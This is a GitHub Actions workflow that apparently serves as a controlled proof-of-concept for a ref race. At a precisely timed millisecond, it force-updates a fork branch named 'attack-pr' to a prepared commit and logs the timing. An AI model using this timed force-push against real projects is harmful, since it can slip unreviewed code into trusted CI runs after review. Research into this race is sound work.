name: Controlled Fork Ref Race

on:
  workflow_dispatch:
    inputs:
      expected_sha:
        description: Current attack-pr SHA
        required: true
        type: string
      target_sha:
        description: Prepared replacement SHA
        required: true
        type: string
      target_epoch_ms:
        description: Unix epoch in milliseconds for the ref update
        required: true
        type: string

permissions:
  contents: write

jobs:
  update-ref:
    runs-on: ubuntu-latest
    steps:
      - name: Wait for the race point and update attack-pr
        env:
          GH_TOKEN: ${{ github.token }}
          EXPECTED_SHA: ${{ inputs.expected_sha }}
          TARGET_SHA: ${{ inputs.target_sha }}
          TARGET_EPOCH_MS: ${{ inputs.target_epoch_ms }}
          REPOSITORY: ${{ github.repository }}
        run: |
          current_sha=$(gh api "repos/$REPOSITORY/git/ref/heads/attack-pr" --jq .object.sha)
          test "$current_sha" = "$EXPECTED_SHA"
          echo "UPDATE_ACTOR=$GITHUB_ACTOR"
          echo "EXPECTED_SHA=$EXPECTED_SHA"
          echo "TARGET_SHA=$TARGET_SHA"
          while (( $(date +%s%3N) < TARGET_EPOCH_MS )); do
            sleep 0.01
          done
          echo "UPDATE_REQUEST_MS=$(date +%s%3N)"
          updated_sha=$(gh api --method PATCH "repos/$REPOSITORY/git/refs/heads/attack-pr" \
            -f sha="$TARGET_SHA" -F force=true --jq .object.sha)
          echo "UPDATED_SHA=$updated_sha"
          echo "UPDATE_COMPLETE_MS=$(date +%s%3N)"
